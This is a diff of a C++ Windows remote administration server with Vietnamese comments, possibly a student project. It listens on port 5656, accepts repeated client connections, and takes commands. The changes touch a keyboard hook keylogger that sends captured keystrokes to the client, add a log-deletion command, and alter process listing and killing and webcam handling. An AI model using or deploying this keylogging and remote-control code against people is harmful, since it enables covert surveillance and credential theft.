@@ -165,9 +165,9 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             
             switch (vkCode) {
                 case VK_SPACE: file << " "; break;
-                case VK_RETURN: file << "Enter\n"; break;
-                case VK_BACK: file << "Backspace"; break;
-                case VK_TAB: file << "Tab"; break;
+                case VK_RETURN: file << " [Enter]"; break;
+                case VK_BACK: file << " [Backspace]"; break;
+                case VK_TAB: file << " [Tab]"; break;
                 case '0': file << (shift ? ")" : "0"); break;
                 case '1': file << (shift ? "!" : "1"); break;
                 case '2': file << (shift ? "@" : "2"); break;
@@ -239,16 +239,21 @@ void printkeys() {
         buffer << file.rdbuf();
         content = buffer.str();
         file.close();
-        
-        // Clear file
         ofstream clearFile(keylogPath, ios::trunc);
         clearFile.close();
     }
     
     if (content.empty()) {
-        content = "\0";
+        content = "Keylog empty.";
     }
+    content += "\n"; 
     send(clientSocket, content.c_str(), content.length(), 0);
+}
+
+void deleteLogFile() {
+    ofstream file(keylogPath, ios::trunc); 
+    file.close();
+    sendLine("Keylogs deleted successfully.");
 }
 
 void keylog() {
@@ -258,6 +263,7 @@ void keylog() {
         if (s == "PRINT") printkeys();
         else if (s == "HOOK") hookKey();
         else if (s == "UNHOOK") unhookKey();
+        else if (s == "DELETE") deleteLogFile();
         else if (s == "QUIT") return;
     }
 }
@@ -380,7 +386,10 @@ void processManagement() {
                     sendLine(toUtf8(proc.szExeFile));
                     sendLine(to_string(proc.th32ProcessID));
                     sendLine(to_string(proc.cntThreads));
+                    Sleep(10);
                 }
+            } else {
+                sendLine("0");
             }
         } else if (ss == "KILL") {
             bool test = true;
@@ -545,6 +554,7 @@ void applicationManagement() {
                 sendLine(app.exeName);     
                 sendLine(to_string(app.pid));
                 sendLine(to_string(app.threads));
+                Sleep(10);
             }
         
         } else if (ss == "KILL") {
@@ -744,56 +754,13 @@ void webcam() {
     }
 }
 
-int main() {
-    WSADATA wsaData;
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-        cerr << "WSAStartup failed" << endl;
-        return 1;
-    }
-    
-    std::thread(BroadcastServerInfo).detach();
-
-    serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (serverSocket == INVALID_SOCKET) {
-        cerr << "Socket creation failed" << endl;
-        WSACleanup();
-        return 1;
-    }
-    
-    sockaddr_in serverAddr;
-    serverAddr.sin_family = AF_INET;
-    serverAddr.sin_addr.s_addr = INADDR_ANY;
-    serverAddr.sin_port = htons(5656);
-    
-    if (bind(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
-        cerr << "Bind failed" << endl;
-        closesocket(serverSocket);
-        WSACleanup();
-        return 1;
-    }
-    
-    if (listen(serverSocket, 100) == SOCKET_ERROR) {
-        cerr << "Listen failed" << endl;
-        closesocket(serverSocket);
-        WSACleanup();
-        return 1;
-    }
-    
-    cout << "Server listening on port 5656..." << endl;
-    
-    clientSocket = accept(serverSocket, NULL, NULL);
-    if (clientSocket == INVALID_SOCKET) {
-        cerr << "Accept failed" << endl;
-        closesocket(serverSocket);
-        WSACleanup();
-        return 1;
-    }
-    
+void processClient(SOCKET client) {
+    clientSocket = client; // Gán socket toàn cục để các hàm con sử dụng
     cout << "Client connected!" << endl;
     
     string s;
     while (true) {
-        receiveSignal(s);
+        receiveSignal(s); // Hàm này sẽ trả về "QUIT" nếu mất kết nối
         
         if (s == "KEYLOG") {
             keylog();
@@ -811,11 +778,38 @@ int main() {
             break;
         }
     }
+    cout << "Client disconnected." << endl;
+}
+
+int main() {
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return 1;
     
-    keepBroadcast = false;
-    closesocket(clientSocket);
+    std::thread(BroadcastServerInfo).detach();
+
+    serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    sockaddr_in serverAddr;
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_addr.s_addr = INADDR_ANY;
+    serverAddr.sin_port = htons(5656);
+    
+    bind(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr));
+    listen(serverSocket, 100);
+    
+    cout << "Server listening on port 5656..." << endl;
+    
+    // VÒNG LẶP VÔ TẬN: Chấp nhận kết nối -> Xử lý -> Lặp lại
+    while (true) {
+        SOCKET client = accept(serverSocket, NULL, NULL);
+        if (client != INVALID_SOCKET) {
+            // Xử lý client (Blocking)
+            // Khi client thoát, hàm này return, vòng lặp while tiếp tục đón client mới
+            processClient(client); 
+            closesocket(client);
+        }
+    }
+    
     closesocket(serverSocket);
     WSACleanup();
-    
     return 0;
 }
